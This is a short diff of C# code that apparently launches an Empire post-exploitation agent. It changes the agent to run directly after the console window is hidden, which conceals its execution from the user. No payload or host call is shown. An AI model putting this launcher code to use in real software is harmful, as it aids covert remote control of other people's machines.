@@ -21,7 +21,7 @@
     using System.Threading;
     using CSharpPy;
 
-    class Program
+    public static class Program
     {
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool AllocConsole();
@@ -59,11 +59,9 @@
             string script = reader.ReadToEnd();
 
             ShowConsoleWindow();
-            new Thread(() =>
-            {
-                Empire.Agent(script);
-            }).Start();
             HideConsoleWindow();
+            Empire.Agent(script);
+            
         }
 
         public static void ShowConsoleWindow()
